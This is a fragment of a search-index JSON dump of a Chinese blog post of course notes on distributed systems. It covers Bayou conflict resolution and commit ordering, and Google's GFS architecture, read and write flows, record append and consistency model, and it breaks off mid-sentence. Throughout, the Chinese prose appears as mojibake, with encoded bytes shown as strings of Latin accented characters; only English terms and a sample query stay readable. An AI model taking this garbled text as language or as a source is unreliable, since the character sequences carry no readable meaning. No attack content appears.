æ­¤éœ€è¦è€ƒè™‘çš„é—®é¢˜æ˜¯ï¼šä»€ä¹ˆæ‰ç®—å†²çªï¼Ÿè¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆå¯¹äºä¸åŒåº”ç”¨æ˜¯ä¸åŒçš„ã€‚åŒç†ï¼Œåˆå¹¶æ“ä½œä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¯¹äºä¼šè®®å®¤é¢„è®¢ç³»ç»Ÿï¼Œå‡å¦‚æˆ‘ä»¬æƒ³é¢„è®¢ä»ä¸‹åˆä¸€ç‚¹åŠå¼€å§‹æŒç»­ä¸€å°æ—¶çš„ä¼šè®®ï¼Œæˆ‘ä»¬ä¼šåœ¨å†™æ“ä½œé‡Œæ·»åŠ è¿™æ ·çš„ä¾èµ–æ£€æŸ¥å’Œåˆå¹¶ç®—æ³•ï¼š query = \"SELECT key FROM Meetings WHERE day=12/18/95 AND start \u003c 2:30pm AND end \u003e 1:30pm\" expected_result = EMPTY merge_proc = ...... éšåï¼ŒBayou å°±ä¼šæ£€æŸ¥ query çš„ç»“æœæ˜¯å¦ç­‰äº expected_result ï¼Œæ˜¯çš„è¯å¯ä»¥ç›´æ¥æ›´æ–°ï¼Œå¦åˆ™å°±éœ€è¦è°ƒç”¨ mergeproc æ¥åˆå¹¶å†²çªã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¾èµ–æ£€æŸ¥å’Œåˆå¹¶ç®—æ³•éœ€è¦æ˜¯ç¡®å®šæ€§çš„ã€‚è¿™æ ·ä¸€æ¥ï¼Œç”±äºæ¯ä¸ªæœåŠ¡å™¨éƒ½ä¼šæŒ‰ç…§ç›¸åŒé¡ºåºè§£å†³å†²çªï¼Œæ¯ä¸ªæœåŠ¡å™¨æœ€ç»ˆè·å¾—çš„ç»“æœä¹Ÿæ˜¯ç›¸åŒçš„ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:8:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å†™æ“ä½œ å½“ä¸€ä¸ªå†™æ“ä½œè¢«æ¥æ”¶æ—¶ï¼Œå®ƒé¦–å…ˆå¤„äº tentative çŠ¶æ€ï¼Œå¹¶ä¸”ä¼šæ ¹æ®å…¶ timestamp è¢«æ’åºï¼›æœ€ç»ˆï¼Œå†™æ“ä½œä¼šå˜æˆ commited çŠ¶æ€ï¼ŒåŒæ ·æ ¹æ®å…¶è¢« commit æ—¶çš„ timestamp è¿›è¡Œæ’åºï¼Œå¹¶ä¸”å¿…å®šæ’åœ¨ tentative å†™æ“ä½œçš„å‰é¢ã€‚è¿™é‡Œ Bayou ä½¿ç”¨äº† Lamport Clock æ¥é¿å…è§£å†³ä¸åŒè®¾å¤‡ä¸Šçš„æ—¶é’ŸåŒæ­¥é—®é¢˜ã€‚ ä¸€ä¸ªè®©äººä¸çˆ½ä½†åˆæ— å¯å¥ˆä½•çš„äº‹æƒ…æ˜¯ï¼Œå½“ Bayou æœåŠ¡å™¨æ¥æ”¶åˆ°æ–°çš„å†™æ“ä½œæ—¶ï¼Œä¹‹å‰çš„å†™æ“ä½œå¯èƒ½ä¸å¾—ä¸è¢«æ’¤é”€ï¼Œç„¶åæ ¹æ®æ–°çš„é¡ºåºé‡æ–°æ‰§è¡Œã€‚å› ä¸ºæ–°çš„å†™æ“ä½œçš„åŠ å…¥ï¼Œæ—§çš„å†™æ“ä½œç”šè‡³å¯èƒ½å‡ºç°å’Œä¹‹å‰ä¸åŒçš„æ‰§è¡Œç»“æœã€‚å½“ä¸€ä¸ªå†™æ“ä½œæœ€åä¸€æ¬¡è¢«æ‰§è¡Œå®Œæ¯•ï¼Œæˆ‘ä»¬å°±ç§°è¯¥æ“ä½œå·²ç»æ˜¯ç¨³å®šçš„äº†ã€‚å¯¹äºé¢„è®¢ä¼šè®®å®¤çš„ç”¨æˆ·æ¥è¯´ï¼Œäº†è§£è‡ªå·±çš„é¢„è®¢æ˜¯å¦å·²ç»ç¨³å®šæ˜¾ç„¶ååˆ†é‡è¦ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:8:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"åˆ¤æ–­ç¨³å®šçŠ¶æ€ é‚£ä¹ˆï¼ŒBayou æœåŠ¡å™¨å¦‚ä½•ç¡®å®šä¸€ä¸ªå†™æ“ä½œæ˜¯å¦å·²ç»ç¨³å®šäº†å‘¢ï¼Ÿä¸€ç§åŠæ³•æ˜¯ç”¨ Lamport Clock é‡Œçš„ timestampï¼Œå¦‚æœä¸€ä¸ªå†™æ“ä½œçš„ timestamp å·²ç»å°äºä»»ä½•æœåŠ¡å™¨æ”¶åˆ°çš„æ–°çš„å†™æ“ä½œçš„ timstampï¼Œé‚£è¯´æ˜åœ¨è¿™ä¸ªå†™æ“ä½œä¹‹å‰å·²ç»æ²¡æœ‰å…¶ä»–å†™æ“ä½œäº†ï¼Œæ‰€ä»¥ä¸€å®šæ˜¯ç¨³å®šçš„ã€‚ä½†æ˜¯ï¼Œå¦‚æœä¸€ä¸ªæœåŠ¡å™¨é•¿æœŸæ–­çº¿ï¼Œé‚£ä¹ˆå®ƒä¸Šçº¿çš„æ—¶å€™å°±ä¼šå¯¼è‡´å¤§é‡å†™æ“ä½œé‡æ–°æ‰§è¡Œã€‚ Bayou é‡‡ç”¨çš„æ–¹æ³•æ˜¯ primary commit æ–¹æ³•ã€‚å› ä¸º commited æ’åœ¨ tentative å‰é¢ï¼Œæˆ‘ä»¬å¯ä»¥è¯´ä¸€ä¸ªå†™æ“ä½œè¢« commit ä¹‹åï¼Œåªè¦èŠ‚ç‚¹å·²ç»è·å¾—äº†ä¹‹å‰æ‰€æœ‰ commited çš„å†™æ“ä½œï¼ˆå¿…ç„¶æˆç«‹ï¼Œè¿™æ˜¯ç”± Bayou æŒ‰é¡ºåºä¼ æ’­å†™æ“ä½œçš„æœºåˆ¶å†³å®šçš„ï¼‰ï¼Œé‚£ä¹ˆè¿™æ¬¡å°±æ˜¯å·²ç»æ˜¯ç¨³å®šçš„äº†ã€‚primary commit å³é€‰æ‹©ä¸€ä¸ªæœåŠ¡å™¨ä½œä¸º primaryï¼Œç”±å®ƒæ¥æ‰§è¡Œ commit çš„æ“ä½œï¼Œå¹¶å°†æ•°æ®åŒæ­¥ç»™å…¶ä»–æœåŠ¡å™¨ã€‚è¿™æ ·åšçš„å¥½å¤„æœ‰ï¼š å³ä½¿ primary å‡ºç°å•ç‚¹æ•…éšœï¼Œå½±å“çš„ä¹Ÿåªæ˜¯ commitï¼Œè€Œä¸æ˜¯æ­£å¸¸çš„è¯»å†™æ“ä½œã€‚ å³ä½¿æŸäº›èŠ‚ç‚¹é•¿æœŸæ–­çº¿ï¼Œä¹Ÿä¸å½±å“ commitï¼Œå› ä¸ºåªæœ‰ primary èƒ½ commitã€‚ èŠ‚ç‚¹æ¥æ”¶åˆ°æ¥è‡ª primary çš„æ•°æ®åŒæ­¥åï¼Œå°±ä¸å†éœ€è¦æœ€æ–° commit ä¹‹å‰çš„ä»»ä½•è®°å½•äº†ï¼Œå› ä¸ºé‚£äº›è®°å½•éƒ½ä¸å¯èƒ½å†æ”¹å˜äº†ã€‚ æœ€åï¼Œå¿…é¡»æ³¨æ„çš„æ˜¯ï¼Œprimary åœ¨å†³å®š commit é¡ºåºçš„æ—¶å€™ï¼Œå¯¹äºæ¥è‡ªåŒä¸€èŠ‚ç‚¹çš„è‹¥å¹²æ¬¡å†™æ“ä½œï¼Œå…¶é¡ºåºå¿…é¡»è¢«ä¿ç•™ã€‚å¦‚æœåœ¨æŸä¸ªèŠ‚ç‚¹ä¸Šå…ˆæ‰§è¡Œäº† createï¼Œç„¶åæ‰§è¡Œ modifyï¼Œé‚£ä¹ˆè®© modify åœ¨ create å‰é¢ commit æ˜¯æ¯«æ— æ„ä¹‰çš„ã€‚ å¯ä»¥çœ‹åˆ°ï¼ŒBayou çš„é—®é¢˜ä¸»è¦åœ¨äºå®ç°ä¾èµ–æ£€æŸ¥å’Œåˆå¹¶ç®—æ³•ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå¢åŠ äº†å¼€å‘ / ä½¿ç”¨ä¸€ä¸ªåº”ç”¨çš„å¤æ‚åº¦ï¼Œä¹Ÿå¹¶ä¸æ˜¯å¯¹æ‰€æœ‰åº”ç”¨éƒ½é€‚åˆç”¨è¿™ç§åŠæ³•ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:8:4","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"GFS GFS æ˜¯è°·æ­Œè®¾è®¡çš„åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿï¼Œå…¶è®¾è®¡åŸºäºå¦‚ä¸‹å‰æï¼š ç³»ç»Ÿç»„ä»¶å¤±æ•ˆæ˜¯å¸¸æ€ï¼Œè€Œéå¼‚å¸¸æƒ…å†µ ä»ä¼ ç»Ÿæ ‡å‡†æ¥çœ‹ï¼Œéœ€è¦å­˜å‚¨çš„æ–‡ä»¶ååˆ†å·¨å¤§ï¼Œå¾€å¾€æ˜¯ GB çº§å’Œ TB çº§çš„ ç›¸æ¯”è¦†ç›–æ–‡ä»¶ä¸­å·²æœ‰çš„å†…å®¹ï¼Œåœ¨æ–‡ä»¶åè¿½åŠ å†…å®¹æ›´ä¸ºé¢‘ç¹ ååŒè®¾è®¡åº”ç”¨ç¨‹åºå’Œæ–‡ä»¶ç³»ç»Ÿçš„ API èƒ½æé«˜çµæ´»æ€§ åŒæ—¶ï¼Œä¹Ÿè¦è€ƒè™‘åˆ°æ‰€éœ€è¦çš„æ–‡ä»¶ç³»ç»Ÿçš„è¡Œä¸ºæ¨¡å¼ï¼š ç”±äºå®¹æ˜“å‡ºç°ç»„ä»¶å¤±æ•ˆï¼Œå› æ­¤éœ€è¦è¿…é€Ÿåœ°è‡ªåŠ¨æ£€æµ‹ã€å®¹å¿å’Œæ¢å¤æ•…éšœ ä¸»è¦å­˜å‚¨å¤§æ–‡ä»¶ï¼Œå¦‚å¤§äº 100 M çš„ è¯»æ“ä½œå¾€å¾€æ˜¯å¤§è§„æ¨¡çš„æµå¼è¯»å–ï¼Œå¦‚å¤§äº 1 M çš„ï¼›ä¸€èˆ¬ä¸ä¼šé‡å¤è¯»å–ï¼Œå³ Read once å†™æ“ä½œå¾€å¾€æ˜¯å¤§è§„æ¨¡çš„é¡ºåºå†™å…¥ï¼Œè€Œä¸”æ˜¯è¿½åŠ å†™å…¥ï¼›ä¸€èˆ¬ä¸ä¼šé‡å¤å†™å…¥ï¼Œå³ Write once éœ€è¦åŸå­çš„å¹¶è¡Œè¿½åŠ å†™å…¥æœºåˆ¶ï¼Œé¿å…å¼•å…¥é”ç­‰å¼€é”€è¾ƒå¤§çš„åŒæ­¥æœºåˆ¶ ","date":"2021-10-18","objectID":"/distributed-systems/:9:0","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"æ¶æ„ ä¸€ä¸ª GFS é›†ç¾¤ä¸­åªæœ‰ä¸€ä¸ª Master èŠ‚ç‚¹ï¼ˆå¯èƒ½åŒ…å«å¤šä¸ª Master æœåŠ¡å™¨ï¼‰ï¼Œè¿™ç§ä¸­å¿ƒåŒ–çš„æ–¹å¼æ­£æ˜¯ä¸ºäº†ç®€åŒ–æ•´ä¸ªç³»ç»Ÿçš„ç®¡ç†ã€‚Master èŠ‚ç‚¹ä¸Šåªæœ‰æ–‡ä»¶çš„å…ƒæ•°æ®ï¼Œè€Œå¤šä¸ª Chunkserver ä¸Šåˆ™æ˜¯æ–‡ä»¶å®é™…å­˜å‚¨çš„åœ°æ–¹ã€‚ æ–‡ä»¶è¢«åˆ†å‰²ä¸º 64 M çš„ Chunkï¼Œæ¯ä¸ª Chunk è¢« Master åˆ†é…ä¸€ä¸ª 64 ä½çš„ IDã€‚Master èŠ‚ç‚¹ä¸Šçš„å…ƒæ•°æ®åŒ…æ‹¬ï¼š Namespace é’ˆå¯¹æ–‡ä»¶çš„è®¿é—®æ§åˆ¶ä¿¡æ¯ æ–‡ä»¶åˆ° Chunk çš„æ˜ å°„ Chunk å½“å‰æ‰€å¤„çš„ Chunkserver å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™äº›å…ƒæ•°æ®éƒ½ä¿å­˜åœ¨ Master çš„å†…å­˜ä¸­ï¼Œåˆå¿«åˆç®€å•ã€‚æ­¤å¤–ï¼ŒMaster èŠ‚ç‚¹è¿˜è´Ÿè´£ç®¡ç† Chunk ç§Ÿç”¨ã€åƒåœ¾å›æ”¶ã€Chunk è¿ç§»ç­‰ç­‰ï¼Œå¹¶é€šè¿‡å¿ƒè·³ä¿¡æ¯ç¡®è®¤ Chunkserver çŠ¶æ€ã€‚ Chunk ä¸€èˆ¬ä¼šåœ¨è‹¥å¹²ä¸ª Chunkserver ä¸Šä¿å­˜ä¸€ä»½å†—ä½™ï¼Œé»˜è®¤æ˜¯ 3 ä¸ªã€‚ä¿å­˜çš„æ–¹å¼å°±æ˜¯æ”¾åœ¨ Linux æ–‡ä»¶ç³»ç»Ÿé‡Œã€‚ç„¶è€Œï¼ŒGFS å¹¶æ²¡æœ‰åƒ NFS ä¸€æ ·å°½é‡æ¨¡ä»¿ Unix æ–‡ä»¶ç³»ç»Ÿ APIï¼Œè€Œæ˜¯è‡ªå·±å®ç°äº† createã€deleteã€openã€closeã€readã€write ç­‰å¸¸ç”¨æ“ä½œã€‚æ­¤å¤–ï¼Œè¿˜æœ‰ snapshot å’Œ record append ä¸¤ä¸ªç‰¹æœ‰çš„æ“ä½œï¼Œåˆ†åˆ«ç”¨äºæ–‡ä»¶å¤‡ä»½å’Œå¯¹æ–‡ä»¶å¹¶è¡Œè¿½åŠ å†™å…¥ã€‚ record append å’Œå¸¸è§„è¿½åŠ å†™å…¥çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œå®ƒéµå¾ª at least once è¯­ä¹‰ï¼Œå¹¶ä¸”è¿½åŠ çš„ä½ç½®æœªå¿…æ˜¯æ–‡ä»¶å°¾éƒ¨ï¼Œè€Œæ˜¯ç”± GFS è®¡ç®—å†³å®šã€‚ ç”±äºåˆ©ç”¨äº† Linux æ–‡ä»¶ç³»ç»Ÿï¼ŒChunkserver ä¸Šä¸éœ€è¦ç¼“å­˜æœºåˆ¶ï¼›è€Œç”±äºæµå¼çš„è¯»å–æ¨¡å¼ï¼ŒGFS å®¢æˆ·ç«¯ä¹Ÿä¸éœ€è¦æœ¬åœ°ç¼“å­˜æ–‡ä»¶ï¼Œåªéœ€è¦ç¼“å­˜å…ƒæ•°æ®å³å¯ã€‚è¿™ä½¿å¾—ç¼“å­˜ä¸€è‡´æ€§ä¸å†æ˜¯é—®é¢˜ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:9:1","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"è¯»æ“ä½œ å›¾ 1ï½œè¯»æ“ä½œæµç¨‹ \" å›¾ 1ï½œè¯»æ“ä½œæµç¨‹ å®¢æˆ·ç«¯å‘ Master å‘é€ read è¯·æ±‚ï¼ŒåŒ…å«æ–‡ä»¶åå’Œ Chunk index Master å›å¤å…ƒæ•°æ®ï¼šChunk IDã€Chunk ç‰ˆæœ¬å·ä»¥åŠå‰¯æœ¬æ‰€å¤„çš„ä½ç½® å®¢æˆ·ç«¯å‘æœ€è¿‘çš„å‰¯æœ¬æ‰€å¤„çš„ Chunkserver å‘é€ read è¯·æ±‚ï¼ŒåŒ…å« Chunk ID å’Œè¯»å–çš„å­—èŠ‚èŒƒå›´ Chunkserver å›å¤å®é™…çš„æ–‡ä»¶æ•°æ® å¯ä»¥çœ‹åˆ°ï¼Œå®¢æˆ·ç«¯å’Œ Master ä¹‹é—´åªæœ‰æ§åˆ¶ä¿¡æ¯çš„äº¤äº’ï¼Œè€Œå®é™…çš„æ•°æ®äº¤äº’ä»…ä»…å‘ç”Ÿåœ¨å®¢æˆ·ç«¯å’Œ Chunkserver ä¹‹é—´ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:9:2","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"å†™æ“ä½œ å›¾ 2ï½œå†™æ“ä½œæµç¨‹ \" å›¾ 2ï½œå†™æ“ä½œæµç¨‹ å¯¹äºæ¯ä¸ª Chunk æ¥è¯´ï¼ŒæŸä¸ªå­˜æ”¾äº†è¯¥ Chunk å‰¯æœ¬çš„ Chunkserver ä¼šæˆä¸º primaryï¼ˆå…¶ä½™å‡ä¸º secondaryï¼‰ï¼Œç”± Master å‘ primary æä¾› 60s çš„ç§Ÿçº¦ï¼ˆå¹¶æ›´æ–° Chunk ç‰ˆæœ¬å·ï¼‰ã€‚ç§Ÿçº¦é€šè¿‡å¿ƒè·³ä¿¡æ¯å»¶ç»­ï¼Œä¹Ÿå¯ä»¥è¢« Master ä¸»åŠ¨å–æ¶ˆã€‚ å®¢æˆ·ç«¯é¦–å…ˆå‘ Master è¯¢é—® primary å’Œ secondary çš„ä½ç½® Master å›å¤ primary å’Œ secondary æ‰€å¤„çš„ä½ç½® å®¢æˆ·ç«¯å‘æœ€è¿‘çš„å‰¯æœ¬æ‰€å¤„çš„ Chunkserverï¼ˆå¯èƒ½æ˜¯ primary æˆ– secondaryï¼‰å‘é€è¦å†™å…¥çš„æ•°æ®ï¼Œæ•°æ®é€šè¿‡ daisy chain çš„æ–¹å¼åœ¨ Chunkserver é—´ä¼ é€’ å½“æ‰€æœ‰å‰¯æœ¬éƒ½ç¡®è®¤æ¥æ”¶åˆ°äº†æ•°æ®åï¼Œå®¢æˆ·ç«¯å‘ primary å‘é€ write è¯·æ±‚ primary ç»™è¯¥è¯·æ±‚åˆ†é…ä¸€ä¸ªåºå·ï¼ˆç”¨äºåœ¨æœ¬åœ°å¯¹å†™æ“ä½œé¡ºåºè¿›è¡Œæ’åºï¼‰ï¼Œå¹¶é€šçŸ¥æ‰€æœ‰ secondary æ‰§è¡Œè¯¥ write è¯·æ±‚ secondary æ‰§è¡Œåå‘ primary å›å¤æ‰§è¡Œç»“æœ primary å‘å®¢æˆ·ç«¯å›å¤æ‰§è¡Œç»“æœ æ‰€è°“ daisy chainï¼Œå³æ•°æ®åœ¨ä¸åŒ Chunkserver ä¹‹é—´ç±»ä¼¼æµæ°´çº¿ä¸€æ ·ä¸€ä¸€ä¼ é€’çš„æ–¹å¼ã€‚è¿™ç§æ–¹å¼ä¸ä»…åˆ©ç”¨äº†ç°ä»£ç½‘çº¿å…¨åŒå·¥çš„ç‰¹æ€§ï¼Œæ›´é‡è¦çš„æ˜¯å¯ä»¥é…åˆæµå¼ä¼ è¾“ï¼Œåœ¨å°šæœªå®Œå…¨æ¥æ”¶åˆ°å…¨éƒ¨æ•°æ®æ—¶å°±å¼€å§‹å‘ä¸‹ä¼ é€’æ•°æ®ï¼Œæé«˜ä¼ è¾“é€Ÿç‡ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:9:3","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"record append æ“ä½œ record append æ“ä½œçš„æµç¨‹å’Œå†™æ“ä½œåŸºæœ¬ä¸€è‡´ï¼Œåœ¨ primary çš„é€»è¾‘ä¸Šç•¥æœ‰åŒºåˆ«ã€‚åœ¨ä¸Šè¿°ç¬¬ 4 æ­¥ä¸­ï¼Œprimary æ¥æ”¶åˆ°æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚åï¼Œä¼šæ£€æŸ¥è¿™æ¬¡ record append æ“ä½œæ˜¯å¦ä¼šå¯¼è‡´ Chunk è¶…å‡ºæœ€å¤§å°ºå¯¸ 64 Mã€‚ å¤§å¤šæ•°æƒ…å†µä¸‹ä¸ä¼šè¶…è¿‡ï¼Œå› æ­¤ primary æŠŠæ•°æ®è¿½åŠ åˆ°è‡ªå·±çš„å‰¯æœ¬å†…ï¼Œé€šçŸ¥ secondary ä¹Ÿè¿™ä¹ˆåšï¼Œç„¶åé€šçŸ¥å®¢æˆ·ç«¯æ‰§è¡Œç»“æœ è€Œå¦‚æœè¶…è¿‡äº†ï¼Œé‚£ä¹ˆ primary ä¼šå°†å½“å‰ Chunk å…ˆå¡«æ»¡ï¼Œé€šçŸ¥ secondary ä¹Ÿè¿™ä¹ˆåšï¼Œç„¶åé€šçŸ¥å®¢æˆ·ç«¯é‡æ–°å‘é€ record append è¯·æ±‚ã€‚è¿™æ ·ï¼Œå½“å®¢æˆ·ç«¯ç¬¬äºŒæ¬¡å‘é€è¯·æ±‚æ—¶ï¼Œå°±ä¸ä¼šå†å‡ºç°è¶…å‡ºæœ€å¤§å°ºå¯¸çš„æƒ…å†µäº† é‚£ä¹ˆï¼Œå¦‚æœä¸€éƒ¨åˆ† secondary åœ¨è¿½åŠ å†™å…¥æ—¶æˆåŠŸäº†ï¼Œå¦ä¸€éƒ¨åˆ†å¤±è´¥äº†å‘¢ï¼Ÿæ¯«æ— ç–‘é—®ï¼Œè¿™ä¼šä½¿å¾— primary é€šçŸ¥å®¢æˆ·ç«¯æ‰§è¡Œå¤±è´¥äº†ï¼Œä»è€Œè®©å®¢æˆ·ç«¯å†æ¬¡å‘é€ record append è¯·æ±‚ã€‚æ­¤æ—¶å°±å¯èƒ½ä¼šå‡ºç°ä¸€ç§ç°è±¡ï¼Œå³æœ‰äº›å‰¯æœ¬ä¸Šè¯¥æ•°æ®å·²ç»è¢«å†™å…¥äº†å¤šæ¬¡ï¼Œè€Œåœ¨æœ‰äº›å‰¯æœ¬ä¸Šåˆ™åªå†™å…¥äº†ä¸€æ¬¡ã€‚è¿™çœ‹èµ·æ¥å¾ˆæ··ä¹±ï¼Œä½†å®é™…ä¸Šå°±æ˜¯ at least once çš„è¯­ä¹‰ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:9:4","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ä¸€è‡´æ€§æ¨¡å‹ é¦–å…ˆå¯ä»¥è‚¯å®šçš„æ˜¯ï¼Œå…ƒæ•°æ®çš„å˜æ›´æ˜¯åŸå­çš„ï¼Œæ¯•ç«Ÿåªæœ‰ä¸€ä¸ª Master èŠ‚ç‚¹ã€‚ç”±äº Master ä¼šç»´æŠ¤å…ƒæ•°æ®å˜æ›´çš„æ—¥å¿—å¹¶åŒæ­¥åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œå³ä½¿ Master é‡å¯ä¹‹åä¾ç„¶å¯ä»¥é‡æ”¾æ—¥å¿—æ¥æ¢å¤å…ƒæ•°æ®ï¼Œä»è€Œæ¢å¤æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚ ä½†å¯¹äºæ•°æ®å˜æ›´è€Œè¨€å°±è¦å¤æ‚å¾ˆå¤šã€‚GFS å®šä¹‰äº†ä¸¤ä¸ªä¸€è‡´æ€§æŒ‡æ ‡ï¼š consistent æ„å‘³ç€ï¼Œä¸€ä¸ªæ–‡ä»¶åŒºåŸŸä¸Šçš„å†…å®¹å¯¹ä»»ä½•å®¢æˆ·ç«¯è€Œè¨€éƒ½æ˜¯ç›¸åŒçš„ï¼Œæ— è®ºå®ƒä»¬æ˜¯ä»å“ªä¸ªå‰¯æœ¬ä¸­è¯»å–çš„ defined æ„å‘³ç€ï¼Œåœ¨å†™æ“ä½œæˆ– record append æ“ä½œåï¼Œä¸€ä¸ªæ–‡ä»¶åŒºåŸŸä¸ä»…æ˜¯ consistent çš„ï¼Œè€Œä¸”ä»»ä½•å®¢æˆ·ç«¯éƒ½èƒ½çœ‹åˆ°å¯¹å…¶çš„æ‰€æœ‰ä¿®æ”¹æ“ä½œ æ ¹æ®è¿™ä¸¤ä¸ªæŒ‡æ ‡ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ï¼š Write Record Append ä¸²è¡Œä¿®æ”¹æˆåŠŸ defined defined interspersed with inconsistent å¹¶è¡Œä¿®æ”¹æˆåŠŸ consistent, undefined defined interspersed with inconsistent ä¿®æ”¹å¤±è´¥ inconsistent Inconsistent å¯¹äºæˆåŠŸçš„å¹¶è¡Œå†™æ“ä½œï¼Œå°½ç®¡ GFS å¯ä»¥ä¿è¯æ–‡ä»¶åŒºåŸŸå†…å®¹ä¸€è‡´ï¼Œä½†ç”±äº primary å¯¹å¹¶è¡Œæ“ä½œçš„æ’åºæœªå¿…å’Œå®é™…å‘èµ·æ“ä½œçš„é¡ºåºä¸€è‡´ï¼Œå®¢æˆ·ç«¯æœªå¿…èƒ½çœ‹åˆ°ä¸€è‡´çš„ä¿®æ”¹æ“ä½œè®°å½•ï¼Œå› æ­¤ defined æ˜¯æ— æ³•ä¿è¯çš„ã€‚å› æ­¤ GFS è®¾è®¡è€…ä¸å»ºè®®ä½¿ç”¨ concurrent writeã€‚ è€Œå¯¹äºæˆåŠŸçš„ä¸²è¡Œæˆ–å¹¶è¡Œ record append æ“ä½œï¼ŒGFS èƒ½é€šè¿‡ at least once è¯­ä¹‰å’Œ primary å¯¹æ“ä½œçš„æ’åºä¿è¯å­˜åœ¨ defined åŒºåŸŸï¼Œä½† defined åŒºåŸŸä¹‹é—´å¯èƒ½ä¼šå­˜åœ¨ inconsistent çš„åŒºåŸŸã€‚è¿™å…¶å®å°±æ˜¯ä¸Šæ–‡ record append æ“ä½œæµç¨‹ä¸­ä»‹ç»çš„éƒ¨åˆ†å‰¯æœ¬ä¸Šå†™å…¥å¤±è´¥å¼•èµ·çš„æ··ä¹±ç»“æœå¯¼è‡´çš„ã€‚ è¿™ç§è¯­ä¹‰çœ‹èµ·æ¥ç›¸å½“å¥‡æ€ªï¼Œå› æ­¤åº”ç”¨ç¨‹åºåœ¨ç¼–å†™æ—¶ä¹Ÿéœ€è¦é’ˆå¯¹è¿™ç§è¯­ä¹‰è¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:9:5","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"åº”ç”¨ç¨‹åº åœ¨æ‰§è¡Œ record append æ—¶ï¼Œåº”ç”¨ç¨‹åºéœ€è¦åŒ…å«ä¸€ä¸ª checksumã€‚è¿™æ ·åœ¨è¯»å–æ•°æ®æ—¶ï¼Œå°±å¯ä»¥æ¯”è¾ƒå®¹æ˜“åœ°åˆ†è¾¨å“ªäº›æ•°æ®æ˜¯å¡«å……æ•°æ®ã€å“ªäº›æ•°æ®æ˜¯æœ‰æ•ˆæ•°æ®ã€‚è€Œå¦‚æœåº”ç”¨ç¨‹åºä¸èƒ½å®¹å¿é‡å¤è¯»å–åˆ°åŒä¸€ä»½æ•°æ®ï¼Œå°±éœ€è¦åœ¨ record append æ—¶åŒ…å«ä¸€ä¸ª unique ID æ¥è¾…åŠ©å»é‡ã€‚ ","date":"2021-10-18","objectID":"/distributed-systems/:9:6","tags":["Linux","åˆ†å¸ƒå¼"],"title":"æ˜Ÿç½—æ£‹å¸ƒï¼šã€Šåˆ†å¸ƒå¼ç³»ç»Ÿä¸å®‰å…¨ã€‹è¯¾ç¨‹ç¬”è®°","uri":"/distributed-systems/"},{"categories":["æ¢ç´¢"],"content":"ç»„ä»¶å¤±æ•ˆ å¦‚æœ Master å¤±æ•ˆï¼Œé‚£ä¹ˆå¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œå®ƒä¼šåœ¨é‡å¯æ—¶é‡æ”¾æ—¥å¿—æ¥æ¢å¤ Namespace ä¿¡æ¯ä»¥åŠæ–‡ä»¶åˆ° Chunk 